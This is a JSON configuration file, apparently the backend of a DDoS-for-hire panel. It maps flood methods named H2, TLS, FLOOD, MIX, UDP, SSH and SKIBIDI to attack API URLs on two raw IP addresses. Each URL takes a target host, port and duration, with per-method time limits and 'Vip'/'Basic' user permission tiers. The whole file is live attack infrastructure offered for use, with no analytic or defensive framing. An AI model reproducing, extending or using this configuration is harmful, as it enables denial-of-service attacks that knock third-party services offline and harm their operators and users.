{
    "H2": {
        "api": {
            "url": "http://188.166.244.36:2250/kudel?host={host}&port={port}&time={time}&methods=H2"
        },
        "maxDuration": 300000,
        "permission": {
            "Vip": true,
            "Basic": true
        }
    },
    "TLS": {
        "api": {
            "url": "http://152.42.243.74:2067/kudel?host={host}&port={port}&time={time}&methods=TLS"
        },
        "maxDuration": 3000000,
        "permission": {
            "Vip": true,
            "Basic": true
        }
    },
    "FLOOD": {
        "api": {
            "url": "http://152.42.243.74:2067/kudel?host={host}&port={port}&time={time}&methods=FLOOD"
        },
        "maxDuration": 300000,
        "permission": {
            "Vip": true,
            "Basic": true
        }
    },
    "MIX": {
        "api": {
            "url": "http://152.42.243.74:2067/kudel?host={host}&port={port}&time={time}&methods=MIX"
        },
        "maxDuration": 30000,
        "permission": {
            "Vip": true,
            "Basic": true
        }
    },
    "UDP": {
        "api": {
            "url": "http://152.42.243.74:2067/kudel?host={host}&port={port}&time={time}&methods=UDP"
        },
        "maxDuration": 300000,
        "permission": {
            "Vip": true,
            "Basic": true
        }
    },
    "SSH": {
        "api": {
            "url": "http://152.42.243.74:2067/kudel?host={host}&port={port}&time={time}&methods=SSH"
        },
        "maxDuration": 300000,
        "permission": {
            "Vip": true,
            "Basic": true
        }
    },
    "SKIBIDI": {
        "api": {
            "url": "http://152.42.243.74:2067/kudel?host={host}&port={port}&time={time}&methods=SKIBIDI"
        },
        "maxDuration": 300000,
        "permission": {
            "Vip": true,
            "Basic": true
        }
    }
}